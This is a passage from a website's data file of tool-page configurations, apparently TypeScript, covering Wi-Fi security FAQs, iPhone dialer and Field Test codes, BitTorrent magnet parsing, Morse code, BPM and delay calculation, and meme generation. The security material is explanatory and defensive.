          "In the 2.4GHz band, each channel center frequency is spaced only 5MHz apart (Channel 1 = 2412MHz, Channel 2 = 2417MHz, etc.), yet a standard 802.11n/ax channel is 20MHz to 22MHz wide. Channels 1, 6, and 11 are the only three channels spaced 25MHz apart so their radio waves do not overlap. Choosing an in-between channel like Channel 3 or 8 causes severe Adjacent-Channel Interference (ACI), where overlapping routers treat each other as raw radio noise rather than taking polite CSMA/CA turns.",
      },
      {
        question: "How does WPA3-SAE stop offline Wi-Fi password cracking compared to WPA2-PSK?",
        answer:
          "In WPA2-PSK, an attacker within radio range can capture a single EAPOL 4-way handshake or a router PMKID frame and run Hashcat offline at hundreds of thousands of guesses per second. WPA3 replaces the static Pre-Shared Key handshake with Simultaneous Authentication of Equals (SAE / Dragonfly handshake), an Elliptic Curve Diffie-Hellman exchange that provides forward secrecy and forces an attacker to interact live with the AP for every single password guess.",
      },
      {
        question: "What are 5GHz DFS (Dynamic Frequency Selection) channels?",
        answer:
          "Channels 52 through 144 in the 5GHz band (UNII-2A and UNII-2C) are shared with military, aviation, and Doppler weather radar systems (especially Terminal Doppler Weather Radar on channels 120–128). Wi-Fi routers using DFS channels must listen for radar pulses for 60–600 seconds (Channel Availability Check) before broadcasting and automatically vacate the channel if radar is detected.",
      },
      {
        question: "How does 802.11w (Protected Management Frames / PMF) prevent Wi-Fi Deauth attacks?",
        answer:
          "In legacy Wi-Fi, management frames (Deauthentication and Disassociation) are completely unauthenticated, allowing cheap ESP8266/Flipper/aireplay-ng tools to spoof the router's MAC address and kick clients offline. Enabling 802.11w (mandatory in WPA3, optional in WPA2) cryptographically signs management frames so client devices ignore forged deauth packets.",
      },
      {
        question: "Does this Wi-Fi QR Code Generator send my SSID or Wi-Fi password to a server?",
        answer:
          "No. Unlike many online QR generators that call remote image APIs with your password in the URL query string, this tool computes the Reed-Solomon error-correction codewords and renders the QR matrix 100% locally in client-side TypeScript.",
      },
    ],
    related: [
      "mac-address-oui-vendor-lookup",
      "password-entropy-breach-checker",
      "brute-force-dictionary-attack-simulator",
      "iphone-secret-dialer-codes-finder",
    ],
    pillarUrl: "https://www.zerosuniverse.com/wireless-network-hacking/",
    pillarTitle: "Wireless Network Security: WEP, WPA2, WPA3 & Channel Hardening",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "iphone-secret-dialer-codes-finder",
    name: "iPhone Field Test Mode & 60+ Secret iOS Dialer Codes Explorer",
    category: "android",
    h1: "iPhone Secret Codes & 5G/LTE Field Test Mode (dBm) Explorer (2026)",
    subhead:
      "Search 60+ hidden iOS and GSM/LTE/5G MMI dialer codes (`*3001#12345#*`, `*#06#`, `*#21#`, `*#62#`) to audit unauthorized call forwarding, check EID/IMEI identity, and translate cellular RSRP/SINR dBm signal metrics.",
    primaryKeyword: "iphone secret codes field test mode",
    secondaryKeywords: [
      "iphone field test mode code *3001#12345#*",
      "ios call forwarding audit codes *#21#",
      "rsrp rsrq sinr dbm signal calculator",
      "gsm mmi ussd codes iphone android",
    ],
    metaTitle: "60+ iPhone Secret Dialer Codes & Field Test Mode dBm Calculator (2026)",
    metaDescription:
      "Explore 60+ working iPhone & GSM MMI/USSD dialer codes for 2026. Launch iOS Field Test Mode (*3001#12345#*), audit hidden call/SMS forwarding (*#21#, *#62#), and convert RSRP/SINR dBm to signal quality.",
    features: [
      {
        title: "Searchable 60+ iOS & Carrier MMI Code Database",
        description:
          "Categorized reference covering Diagnostics & Identity (`*#06#`), Call Forwarding Security Audits (`*#21#`, `##002#`), Call Waiting/Barring, Caller ID Privacy (`*67`), and Carrier Billing USSD codes.",
        icon: "Search",
      },
      {
        title: "Interactive Field Test Mode (`*3001#12345#*`) dBm Analyzer",
        description:
          "Input your iPhone Field Test Mode RSRP (-44 to -140 dBm), RSRQ (-3 to -20 dB), and SINR (-5 to +30 dB) readings to calculate logarithmic milliwatt power, 5G/LTE band speed potential, and cell tower congestion.",
        icon: "Activity",
      },
      {
        title: "1-Click Anti-Stalkerware Call Diversion Audit Workflow",
        description:
          "Step-by-step verification sequence (`*#21#`, `*#61#`, `*#62#`, `*#67#`) to detect unauthorized voice/SMS/data forwarding and erase all conditional diversions globally with `##002#`.",
        icon: "Shield",
      },
      {
        title: "Auto-Execute vs Press-Call Execution Badges",
        description:
          "Clearly labels which codes trigger the instant the final `#` or `*` is tapped versus which MMI strings require pressing the green Phone Call button.",
        icon: "Zap",
      },
    ],
    useCases: [
      {
        title: "Cellular Dead-Zone & Home Signal Booster Alignment",
        description:
          "Use `*3001#12345#*` alongside our RSRP/SINR dBm calculator to measure true 3 dB (2× power) signal gains where Apple's 4-bar status icon is too coarse to show changes.",
      },
      {
        title: "Mobile Privacy & SIM/Forwarding Tamper Check",
        description:
          "Verify in 15 seconds that nobody with brief physical access to your unlocked phone configured conditional or unconditional call forwarding (`*21*` / `*62*`) to another number.",
      },
      {
        title: "eSIM Provisioning & Stolen Device IMEI/EID Lookup",
        description:
          "Display scannable IMEI1, IMEI2, EID, and MEID barcodes instantly via `*#06#` without navigating through iOS Settings.",
      },
    ],
    howTo: [
      {
        name: "Filter Secret Codes by Category or Search Keyword",
        text: "Browse All, Security & Forwarding Audit, RF Diagnostics, Caller ID, or Carrier (AT&T, Verizon, T-Mobile) codes.",
      },
      {
        name: "Copy Any Code into the Native iOS Phone Keypad",
        text: "Tap Copy Code, open the Apple Phone app's Keypad tab, paste the string, and press the green Call button (if marked 'Press Call').",
      },
      {
        name: "Test Your RSRP, RSRQ & SINR in the Field Test Lab",
        text: "After dialing `*3001#12345#*`, enter your `rsrp0` (dBm) and `sinr0` (dB) values into the interactive sliders to evaluate your cell tower connection.",
      },
      {
        name: "Run `##002#` If Unexpected Call Forwarding Appears",
        text: "If `*#21#` or `*#67#` reveals an unfamiliar forwarding destination (other than your carrier's official voicemail center), dial `##002#` to wipe all diversions.",
      },
    ],
    faq: [
      {
        question: "Why does dialing *#21# or *#62# sometimes show an active phone number even if I wasn't hacked?",
        answer:
          "Viral social media posts often claim that seeing a phone number under `*#61#` (When Unanswered), `*#62#` (When Unreachable), or `*#67#` (When Busy) proves your phone is tapped. In reality, mobile carriers use Conditional Call Forwarding by default to route unanswered or busy calls to your carrier's official Voicemail Deposit Center number. Only unconditional forwarding (`*#21#` active for all calls) or forwarding to an unrecognized personal phone number indicates tampering.",
      },
      {
        question: "How do I read RSRP (dBm) and SINR (dB) inside iPhone Field Test Mode (*3001#12345#*)?",
        answer:
          "RSRP (Reference Signal Received Power) is measured in negative decibel-milliwatts (dBm) on a logarithmic scale where every 3 dB increase doubles the signal power: `-44 to -79 dBm` is Excellent (near the cell site), `-80 to -90 dBm` is Good, `-91 to -105 dBm` is Fair, and `-110 dBm or lower` is a cell edge dead-zone. SINR (Signal-to-Interference-plus-Noise Ratio) measures signal clarity: above `+20 dB` enables peak 5G 256-QAM speeds, while below `0 dB` indicates heavy interference.",
      },
      {
        question: "What does the master reset code ##002# do?",
        answer:
          "Dialing `##002#` and pressing Call sends a standard 3GPP GSM/LTE/5G Supplementary Service deactivation command to your carrier's core network, immediately erasing all unconditional (`21`) and conditional (`61`, `62`, `67`) call forwarding rules on your line.",
      },
      {
        question: "Why do some codes execute automatically while others require pressing the green Call button?",
        answer:
          "Codes processed locally by iOS firmware (such as `*#06#` to display hardware IMEI/EID barcodes) trigger the moment the final `#` is typed. Codes that query or modify network-side settings on your carrier's HLR/HSS switch (such as `*3001#12345#*`, `*#21#`, or `##002#`) require pressing the green Call button to transmit the MMI/USSD request over the air.",
      },
      {
        question: "How do I hide my Caller ID for a single outbound phone call?",
        answer:
          "In North America (NANP carriers like AT&T, Verizon, and T-Mobile), dial `*67` followed immediately by the 10-digit phone number (e.g., `*672125550199`). In Europe, the UK, India, and Australia (GSM standard), prefix the number with `#31#` (e.g., `#31#07700900077`).",
      },
    ],
    related: [
      "wifi-qr-code-channel-planner",
      "webcam-mic-hardware-privacy-tester",
      "mac-address-oui-vendor-lookup",
      "bios-beep-code-shortcut-troubleshooter",
    ],
    pillarUrl: "https://www.zerosuniverse.com/iphone-secret-codes/",
    pillarTitle: "60+ iPhone Secret Codes: Unlock Hidden iOS Diagnostics in 2026",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "torrent-magnet-bencode-inspector",
    name: "BitTorrent Magnet URI Builder & Tracker Bencode Inspector",
    category: "android",
    h1: "BitTorrent Magnet URI Builder, Parser & `.torrent` Bencode Inspector (2026)",
    subhead:
      "Parse or construct BEP-9/BEP-52 BitTorrent Magnet links (`urn:btih:` & `urn:btmh:`), inject curated high-speed UDP/WSS public trackers, and inspect `.torrent` Bencode dictionaries with live SHA-1 InfoHash calculation.",
    primaryKeyword: "magnet link generator tracker inspector",
    secondaryKeywords: [
      "bittorrent magnet uri parser",
      "torrent bencode decoder online",
      "torrent infohash sha1 calculator",
      "best udp webtorrent trackers list",
    ],
    metaTitle: "BitTorrent Magnet URI Builder & .torrent Bencode Inspector (2026)",
    metaDescription:
      "Decode or build BitTorrent Magnet links from SHA-1/Base32 InfoHashes, inject open UDP & WebSocket trackers, and inspect .torrent files locally in your browser with SHA-1 InfoHash verification.",
    features: [
      {
        title: "Bi-Directional Magnet URI Parser & Generator",
        description:
          "Deconstruct any `magnet:?xt=urn:btih:...` URI into its 40-char Hex / 32-char Base32 InfoHash, display name (`dn`), exact byte length (`xl`), web seeds (`ws`), and tracker announce tiers (`tr`).",
        icon: "Globe",
      },
      {
        title: "40-Hex ↔ 32-Base32 InfoHash Converter",
        description:
          "Automatically translates between standard 160-bit hexadecimal SHA-1 InfoHashes and legacy RFC 4648 Base32 magnet hashes without losing a single bit.",
        icon: "Code",
      },
      {
        title: "Curated UDP, HTTPS & WebTorrent (WSS) Tracker Injector",
        description:
          "Boost peer discovery on Linux ISO and open-dataset swarms by appending verified BEP-15 UDP (`udp://`), HTTPS, and browser WebTorrent (`wss://`) tracker lists with deduplication.",
        icon: "Wifi",
      },
      {
        title: "Local `.torrent` Binary Bencode Decoder & SHA-1 Hasher",
        description:
          "Drop any `.torrent` file into the browser to parse its Bencode (`d...e`, `l...e`, `i...e`) dictionary tree, file list, piece length, `private=1` flag, and compute the exact SHA-1 digest of the raw `info` dictionary.",
        icon: "Database",
      },
    ],
    useCases: [
      {
        title: "Constructing Magnet Links From Raw InfoHashes",
        description:
          "Convert a bare 40-character SHA-1 InfoHash into a full RFC-compliant Magnet URI complete with display name and active UDP tracker URLs.",
      },
      {
        title: "Auditing `.torrent` Metadata & Private Tracker Flags",
        description:
          "Inspect a `.torrent` file before opening it in qBittorrent or Transmission to see every embedded file path, piece size, creation timestamp, and whether the BEP-27 `private: 1` flag disables DHT/PEX.",
      },
      {
        title: "WebTorrent & P2P Browser Swarm Testing",
        description:
          "Append `wss://` WebRTC WebSocket trackers so browser-based WebTorrent clients can join hybrid torrents.",
      },
    ],
    howTo: [
      {
        name: "Paste an Existing Magnet Link or Bare 40-Hex InfoHash",
        text: "Drop a `magnet:?xt=...` URI or a 40-character SHA-1 hash into the inspector (or load the Ubuntu 24.04 LTS sample preset).",
      },
      {
        name: "Edit Display Name & Inject Public Tracker Tiers",
        text: "Customize the `dn=` title and click 'Append High-Speed UDP Trackers' or 'Append WebTorrent WSS Trackers' to deduplicate and enrich the announce list.",
      },
      {
        name: "Or Drop a `.torrent` File Into the Local Bencode Inspector",
        text: "Select a `.torrent` file from disk to decode its Bencode structure, file manifest, and verify its SHA-1 InfoHash via WebCrypto.",
      },
      {
        name: "Copy or Launch the Rebuilt Magnet URI",
        text: "Copy the normalized Magnet URI or click 'Open Magnet in Client' to hand it directly to your local BitTorrent client.",
      },
    ],
    faq: [
      {
        question: "How does a Magnet link download a torrent without a .torrent file?",
        answer:
          "A Magnet URI contains the 160-bit SHA-1 InfoHash (`xt=urn:btih:...`) of the torrent's `info` dictionary. Using BEP-5 (Mainline DHT) and BEP-9 (Extension for Peers to Send Metadata Files), your BitTorrent client locates peers holding that exact InfoHash, downloads the small `info` metadata dictionary directly from the swarm, verifies that its SHA-1 hash matches the Magnet URI, and then begins downloading data pieces.",
      },
      {
        question: "Why is a BitTorrent InfoHash uniquely tied to the Bencode 'info' dictionary?",
        answer:
          "In a `.torrent` file, the outer Bencode dictionary contains changeable fields like `announce` and `announce-list`, plus an inner `info` dictionary containing the immutable file names, byte lengths, `piece length`, and concatenated 20-byte SHA-1 piece hashes. The InfoHash is the SHA-1 (v1) or SHA-256 (BEP-52 v2) digest of the exact raw Bencoded bytes of that `info` dictionary—so adding or removing trackers never alters the InfoHash.",
      },
      {
        question: "Why do public trackers prefer UDP (BEP-15) over HTTP/HTTPS?",
        answer:
          "HTTP tracker announces require a full TCP 3-way handshake, TLS negotiation, and verbose HTTP headers for every peer check-in. The BEP-15 UDP Tracker Protocol uses a compact 16-byte connection request and 98-byte announce packet, cutting bandwidth and server CPU overhead by over 80%.",
      },
      {
        question: "What does the 'private = 1' flag inside a .torrent file's info dictionary do?",
        answer:
          "Defined in BEP-27, setting `i1e` for the `private` key inside the `info` dictionary instructs compliant clients (qBittorrent, Transmission, rTorrent) to disable Distributed Hash Table (DHT), Peer Exchange (PEX), and Local Peer Discovery (LPD) for that torrent, ensuring peers only connect via the private tracker's passkey URL. Because `private` is inside the `info` dictionary, toggling it changes the InfoHash.",
      },
      {
        question: "How does Bencode serialize integers, strings, lists, and dictionaries?",
        answer:
          "Bencode uses four deterministic ASCII primitives: Byte strings are length-prefixed (`4:spam`); Integers are wrapped in `i` and `e` (`i42e`); Lists wrap elements in `l` and `e` (`l4:spami42ee`); and Dictionaries wrap lexicographically sorted key-value pairs in `d` and `e`. Because dictionary keys must be strictly sorted in raw byte order, any given `info` dictionary has only one canonical byte representation and therefore one deterministic InfoHash.",
      },
    ],
    related: [
      "pgp-aes-webcrypto-encryption-studio",
      "ip-asn-os-fingerprint-inspector",
      "ddos-pps-bandwidth-waf-calculator",
      "wifi-qr-code-channel-planner",
    ],
    pillarUrl: "https://www.zerosuniverse.com/torrents/",
    pillarTitle: "What Are Torrents & How P2P Magnet Links and Trackers Work",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },

  // =========================================================================
  // WAVE 2 — CREATOR, AUDIO & FINTECH APPS (4 Tools: #25 – #28)
  // =========================================================================
  {
    slug: "morse-code-audio-flashlight-translator",
    name: "Morse Code Audio Oscillator, Screen Flashlight & Text Translator",
    category: "apps",
    h1: "Morse Code Translator, CW Audio Oscillator & Visual Beacon (2026)",
    subhead:
      "Translate English text to ITU-R M.1677 International Morse Code (`·` and `−`) and back, play precision WebAudio CW sine-wave tones with PARIS WPM timing, trigger visual screen strobes, and export `.wav` audio files.",
    primaryKeyword: "morse code translator audio player",
    secondaryKeywords: [
      "international morse code translator online",
      "cw audio oscillator wpm farnsworth",
      "morse code to wav file generator",
      "morse code flashlight visual beacon",
    ],
    metaTitle: "Morse Code Translator, CW Audio Player & WAV Exporter (2026)",
    metaDescription:
      "Bi-directional International Morse Code translator with a real-time WebAudio CW tone generator (400–1000Hz), adjustable PARIS WPM speed, synchronized visual flash beacon, and 16-bit PCM .wav download.",
    features: [
      {
        title: "Bi-Directional ITU-R M.1677 Morse Engine",
        description:
          "Instantly converts A–Z, 0–9, punctuation, and amateur radio prosigns (`SOS`, `CQ`, `AR`, `SK`, `73`) between English text and standard dot/dash notation.",
        icon: "Code",
      },
      {
        title: "Envelope-Shaped WebAudio CW Oscillator",
        description:
          "Synthesizes click-free Continuous Wave (CW) sine tones with 5ms raised-cosine attack/release envelopes, adjustable pitch (400Hz–1000Hz, default 650Hz), and exact PARIS WPM timing ($T_{\\text{dit}} = 1200 / \\text{WPM}$ ms).",
        icon: "Activity",
      },
      {
        title: "Synchronized Visual Beacon & Live Character Highlighter",
        description:
          "Flashes a high-contrast optical beacon (with fullscreen emergency signaling mode) while highlighting each active letter and dot/dash element in real time during playback.",
        icon: "Zap",
      },
      {
        title: "Client-Side 16-Bit PCM `.wav` Audio File Exporter",
        description:
          "Renders your complete Morse code message into a downloadable 44.1kHz mono RIFF `.wav` audio file directly in browser RAM—ready for CTF challenges, video editing, or offline practice.",
        icon: "Terminal",
      },
    ],
    useCases: [
      {
        title: "Amateur (Ham) Radio CW Ear Training",
        description:
          "Practice copying callsigns, Q-codes (`QTH`, `QSL`, `QRZ`), and standard QSO exchanges at 5 to 40 Words Per Minute using clean 600Hz–700Hz sidetone audio.",
      },
      {
        title: "CTF Steganography & Audio Puzzle Creation",
        description:
          "Decode dot-dash strings from Capture The Flag challenges or export custom `.wav` CW transmissions at specific frequencies.",
      },
      {
        title: "Emergency Visual & Acoustic Signaling",
        description:
          "Transmit `SOS` (`··· −−− ···`) or custom location beacons using synchronized high-output audio and fullscreen white optical flashes.",
      },
    ],
    howTo: [
      {
        name: "Type English Text or Morse Code (`.` and `-`)",
        text: "Enter plain text in the top box or type Morse symbols (`.` for dit, `-` for dah, space between letters, `/` between words) in the Morse editor.",
      },
      {
        name: "Configure WPM Speed & Sidetone Frequency (Hz)",
        text: "Adjust playback speed from 5 WPM (beginner) to 40 WPM (contest speed) and set your preferred audio pitch (e.g., 650 Hz).",
      },
      {
        name: "Press Play to Hear CW Audio & Watch the Visual Beacon",
        text: "Listen to the synthesized tone sequence while following the synchronized character-by-character highlight and optical flash lamp.",
      },
      {
        name: "Download 44.1kHz `.wav` Audio or Copy Prosigns",
        text: "Click 'Download .WAV' to save a lossless audio file of your Morse transmission or copy the formatted Unicode (`· −`) string.",
      },
    ],
    faq: [
      {
        question: "How are Morse Code dot, dash, and space durations mathematically defined?",
        answer:
          "International Morse Code timing is based on a single base unit: the duration of one dot (`dit`). A dash (`dah`) lasts exactly 3 units; the intra-character gap between dots and dashes inside the same letter is 1 unit; the inter-character gap between letters is 3 units; and the gap between words is 7 units.",
      },
      {
        question: "Why does the formula 1200 / WPM determine the millisecond length of a dot?",
        answer:
          "The standard reference word for measuring Morse Code speed is `'PARIS'`, which requires exactly 50 timing units (including its trailing word space). At 1 Word Per Minute (60,000 milliseconds per minute), 50 units take 60,000 ms, so 1 unit takes $60000 / 50 = 1200\\text{ ms}$. Therefore, at any speed $W$ WPM, a single dot lasts $T_{\\text{dit}} = 1200 / W$ milliseconds (e.g., 60 ms at 20 WPM).",
      },
      {
        question: "Why is E a single dot (.) and T a single dash (-) in Morse Code?",
        answer:
          "Samuel Morse and Alfred Vail designed the code using variable-length prefix encoding (an early precursor to Huffman coding) after counting physical lead type pieces in a Morristown, New Jersey printing press. The most frequent letters in English (`E` and `T`) received the shortest 1-symbol codes, while rare letters (`Q`, `Z`, `J`, `X`) received 4-symbol combinations.",
      },
      {
        question: "Why does SOS (`··· −−− ···`) mean distress and why is it sent as a single prosign?",
        answer:
          "`SOS` does not stand for 'Save Our Ship' or 'Save Our Souls'—it was adopted by the 1906 Berlin International Radiotelegraphic Convention because three dots, three dashes, and three dots form an unmistakable, symmetric rhythm. Strictly speaking, it is transmitted as a continuous 9-element prosign (`...---...`) without the 3-unit inter-character spaces between S, O, and S.",
      },
      {
        question: "How does this tool prevent harsh speaker clicks at the start and end of each tone?",
        answer:
          "Instantaneously switching a sine-wave oscillator from 0.0 to 1.0 amplitude creates high-frequency spectral splatter known in radio telegraphy as 'key clicks'. Our WebAudio engine applies a 5-millisecond linear/raised-cosine gain ramp on the rising and falling edge of every dit and dah for smooth, ear-friendly sidetone audio.",
      },
    ],
    related: [
      "bpm-tap-tempo-synth-frequency-studio",
      "bios-beep-code-shortcut-troubleshooter",
      "webcam-mic-hardware-privacy-tester",
      "pgp-aes-webcrypto-encryption-studio",
    ],
    pillarUrl: "https://www.zerosuniverse.com/best-morse-code-apps/",
    pillarTitle: "10 Best Morse Code Learning & Translator Apps for 2026",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "bpm-tap-tempo-synth-frequency-studio",
    name: "WebAudio BPM Tap Tempo, Metronome & Note Frequency Studio",
    category: "apps",
    h1: "WebAudio BPM Tap Tempo, Metronome, Delay Time & Note Frequency Studio (2026)",
    subhead:
      "Tap any beat to measure BPM with sub-millisecond precision, run a hardware-locked WebAudio metronome, compute DAW delay/reverb millisecond subdivisions (1/4, Dotted, Triplet), and audition $A_4 = 440\\text{ Hz}$ synth note frequencies.",
    primaryKeyword: "bpm tap tempo delay calculator",
    secondaryKeywords: [
      "tap tempo bpm counter online",
      "delay reverb time calculator ms hz",
      "music note to frequency hz chart",
      "webaudio metronome online",
    ],
    metaTitle: "BPM Tap Tempo, Metronome & DAW Delay/Reverb Time Calculator (2026)",
    metaDescription:
      "Measure song BPM via keyboard/click tap tempo, play a drift-free WebAudio metronome, calculate Straight, Dotted (×1.5), and Triplet (×0.667) delay/LFO times in ms and Hz, and audition MIDI note frequencies.",
    features: [
      {
        title: "Outlier-Filtered Rolling BPM Tap Detector",
        description:
          "Tap the Spacebar or click pad to compute instantaneous and rolling-average BPM, samples per beat (44.1kHz / 48kHz), and traditional Italian tempo markings (Largo to Prestissimo).",
        icon: "Activity",
      },
      {
        title: "Sub-Millisecond WebAudio Lookahead Metronome",
        description:
          "Schedules downbeat and subdivision clicks directly on `AudioContext.currentTime` with 4/4, 3/4, 6/8, 5/4, and 7/8 time signatures—eliminating browser `setInterval` timing jitter.",
        icon: "Zap",
      },
      {
        title: "Complete DAW Delay, Pre-Delay & LFO Subdivision Matrix",
        description:
          "Instantly calculates Straight, Dotted ($1.5\\times$), and Triplet ($2/3\\times$) durations in milliseconds (ms) and LFO Hertz (Hz) from 2 Bars down to 1/64th notes.",
        icon: "Cpu",
      },
      {
        title: "Interactive Synth Note-to-Frequency ($A_4 = 440\\text{ Hz}$ / $432\\text{ Hz}$) Auditioner",
        description:
          "Click any piano key across octaves 1–7 to hear Sine, Triangle, Sawtooth, or Square oscillator tones and copy the exact fundamental frequency ($f = f_{\\text{ref}} \\times 2^{(m-69)/12}$) for EQ and 808 tuning.",
        icon: "Terminal",
      },
    ],
    useCases: [
      {
        title: "Vocal Reverb Pre-Delay & Slapback Delay Locking",
        description:
          "Set your vocal plate reverb pre-delay to a 1/64th note (e.g., 31.25 ms at 120 BPM) and decay tail to 1 Bar so spatial effects breathe naturally with the groove without muddying dry transients.",
      },
      {
        title: "Sample Tempo Matching & Compressor Release Tuning",
        description:
          "Tap along to an unlabelled vinyl loop or vocal acapella to find its exact BPM, and set your bus compressor release time to a 1/16th note so gain reduction recovers before the next kick hit.",
      },
      {
        title: "Sub-Bass & 808 Surgical EQ Frequency Lookup",
        description:
          "Look up and audition the exact fundamental Hz of your song's root key (e.g., $F_1 = 43.65\\text{ Hz}$ or $G_1 = 49.00\\text{ Hz}$) for precise high-pass filtering and resonant EQ boosts.",
      },
    ],
    howTo: [
      {
        name: "Tap the Beat (Spacebar / Click) or Enter a Known BPM",
        text: "Press Spacebar repeatedly to the rhythm of your track to lock in the tempo, or drag the BPM slider from 30 to 300 BPM.",
      },
      {
        name: "Start the WebAudio Metronome & Pick a Time Signature",
        text: "Select 4/4, 3/4, 6/8, 5/4, or 7/8 and toggle the metronome to verify the tempo against your recording or instrument.",
      },
      {
        name: "Copy Straight, Dotted, or Triplet Delay/Reverb Times",
        text: "Click any millisecond (ms) or LFO rate (Hz) cell in the subdivision matrix to copy it directly into FabFilter, Valhalla, or your DAW.",
      },
      {
        name: "Audition Note Frequencies in the 12-TET Synth Studio",
        text: "Choose your reference tuning ($440\\text{ Hz}$ or $432\\text{ Hz}$), select an oscillator waveform, and click any note to hear its pitch and copy its exact Hz value.",
      },
    ],
    faq: [
      {
        question: "How do you calculate delay time in milliseconds (ms) from BPM?",
        answer:
          "There are 60,000 milliseconds in one minute. Dividing 60,000 by the tempo in Beats Per Minute gives the duration of a single quarter note (1/4 note): $T_{1/4} = 60000 / \\text{BPM}\\text{ ms}$. From that quarter-note base, a 1/8th note is half ($T_{1/4} / 2$), a 1/16th note is a quarter ($T_{1/4} / 4$), a Dotted note multiplies the straight value by $1.5$, and a Triplet multiplies the straight value by $2/3$ ($0.6667$).",
      },
      {
        question: "How should I set my reverb Pre-Delay and Decay Time using the BPM chart?",
        answer:
          "Set your Reverb Pre-Delay to a short subdivision like a 1/64th or 1/32nd note (typically 15 ms to 45 ms) to create a clean Haas-effect separation between the dry vocal transient and the onset of the reverb tail. Then subtract that Pre-Delay from a 1/2-note or 1-Bar duration to set your RT60 Decay Time so the reverb tail finishes right on the downbeat.",
      },
      {
        question: "Why does a Dotted 1/8th note delay create the classic rhythmic bounce in pop and electronic music?",
        answer:
          "A Dotted 1/8th note equals three 1/16th notes ($0.75$ of a beat). When you play steady 1/8th notes through a Dotted 1/8th delay (popularized by U2's The Edge and modern synthwave/EDM producers), every delayed echo lands squarely on the off-beat 1/16th grid between your dry notes, creating an intricate 16th-note syncopated groove.",
      },
      {
        question: "How is the frequency (Hz) of any musical note calculated from MIDI note numbers?",
        answer:
          "In 12-Tone Equal Temperament (12-TET), every octave doubles the frequency and is divided into 12 logarithmically equal semitones (each semitone multiplies frequency by $2^{1/12} \\approx 1.059463$). Given concert pitch $A_4 = 440\\text{ Hz}$ (MIDI note 69), any MIDI note $m$ has frequency $f = 440 \\times 2^{(m - 69)/12}\\text{ Hz}$.",
      },
      {
        question: "Why do standard JavaScript setInterval() metronomes drift out of time?",
        answer:
          "`setInterval()` runs on the browser's main UI thread and is subject to garbage-collection pauses, layout repaints, and background tab throttling (often jittering by 10–30 ms). Our metronome uses the Chris Wilson two-clock lookahead architecture, scheduling oscillator envelopes directly onto the hardware audio clock (`AudioContext.currentTime`) with sub-millisecond sample accuracy.",
      },
    ],
    related: [
      "morse-code-audio-flashlight-translator",
      "webcam-mic-hardware-privacy-tester",
      "zero-watermark-meme-generator-studio",
      "voice-changer-pitch-studio",
    ],
    pillarUrl: "https://www.zerosuniverse.com/best-music-production-software/",
    pillarTitle: "10 Best Music Production Software & DAWs in 2026",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "zero-watermark-meme-generator-studio",
    name: "Zero-Watermark HTML5 Canvas Meme & Tech Social Card Studio",
    category: "apps",
    h1: "Zero-Watermark HTML5 Canvas Meme & Tech Social Card Studio (2026)",
    subhead:
      "Create high-resolution classic top/bottom Impact memes, modern X/Reddit white-header caption cards, and dark-mode developer social graphics with 100% client-side HTML5 Canvas rendering and zero watermarks.",
    primaryKeyword: "meme generator no watermark",
    secondaryKeywords: [
      "meme maker online no watermark",
      "twitter x header caption meme generator",
      "developer tech meme creator",
      "private client side meme studio",
    ],
    metaTitle: "Zero-Watermark Meme Generator Studio (2026) — Private HTML5 Canvas Creator",
    metaDescription:
      "Create and export crisp PNG/WebP memes with zero watermarks and zero cloud uploads. Switch between Classic Impact stroke, Modern White Caption Bar, and Dark Tech Social Card layouts.",
    features: [
      {
        title: "100% Zero-Watermark, Zero-Upload HTML5 Canvas Engine",
        description:
          "Renders your custom uploaded photos or built-in vector templates directly inside an in-memory HTML5 `<canvas>`—never branding your bottom corner with an ugly site watermark.",
        icon: "Zap",
      },
      {
        title: "3 Layout Modes (Classic Impact, Modern White Header & Dark Tech Card)",
        description:
          "Switch instantly between classic stroked top/bottom overlays, modern X/Instagram white top caption boxes, and sleek dark-mode developer social cards.",
        icon: "Code",
      },
      {
        title: "Precision Stroke, Typography & Aspect Ratio Controls",
        description:
          "Customize font family (Impact, Inter Bold, JetBrains Mono), font size, outline stroke thickness, text colors, and social aspect ratios (1:1 Square, 4:5 Portrait, 16:9 Landscape).",
        icon: "Activity",
      },
      {
        title: "1-Click Clipboard Image Copy & PNG/WebP Export",
        description:
          "Copy the rendered PNG bitmap directly to your system clipboard (`ClipboardItem`) to paste straight into Slack, Discord, X, or GitHub PR comments, or download lossless PNG/WebP.",
        icon: "Terminal",
      },
    ],
    useCases: [
      {
        title: "Internal Team Slack, Discord & PR Humor (100% Private)",
        description:
          "Turn internal architecture diagrams, incident post-mortems, or team photos into memes without uploading confidential company screenshots to public meme servers.",
      },
      {
        title: "High-Engagement X (Twitter), LinkedIn & Reddit Posts",
        description:
          "Export crisp 1200px PNGs in 1:1 or 4:5 aspect ratios with zero third-party watermarks that trigger algorithmic suppression on social feeds.",
      },
      {
        title: "Developer & Cybersecurity Community Memes",
        description:
          "Use built-in tech caption presets (`git push --force`, DNS propagation, production vs staging, AI context windows) with monospace code typography.",
      },
    ],
    howTo: [
      {
        name: "Upload Any Image or Pick a Built-In Vector Template",
        text: "Drag-and-drop a local PNG/JPG/WebP file (processed 100% locally via `FileReader`) or select a built-in multi-panel/gradient canvas.",
      },
      {
        name: "Choose Your Layout Style & Aspect Ratio",
        text: "Select Classic Top/Bottom Impact, Modern White Header Bar, or Dark Tech Card, and pick 1:1, 4:5, or 16:9 dimensions.",
      },
      {
        name: "Customize Captions, Font Family & Stroke Width",
        text: "Type your Top, Bottom, or Panel captions and fine-tune font size, uppercase lock, and black outline stroke thickness.",
      },
      {
        name: "Copy Directly to Clipboard or Download PNG / WebP",
        text: "Click 'Copy Image to Clipboard' to paste directly into Discord/Slack/X, or download the unwatermarked full-resolution PNG or WebP file.",
      },
    ],
    faq: [
      {
        question: "Why does white Impact text with a black stroke remain readable on any background?",
        answer:
          "In digital typography and accessibility, surrounding high-luminance white glyphs (`#FFFFFF`) with a continuous black (`#000000`) outer stroke (`ctx.strokeText()` drawn with `lineJoin = 'round'` before `ctx.fillText()`) guarantees a maximum 21:1 WCAG luminance contrast boundary regardless of how bright, dark, or noisy the underlying photograph is.",
      },
      {
        question: "Why do social media algorithms penalize memes with third-party watermarks?",
        answer:
          "Platforms like Instagram, X, LinkedIn, and Reddit use optical character and logo detection models to identify recycled content bearing third-party generator or competitor watermarks, reducing organic reach compared to clean, native uploads.",
      },
      {
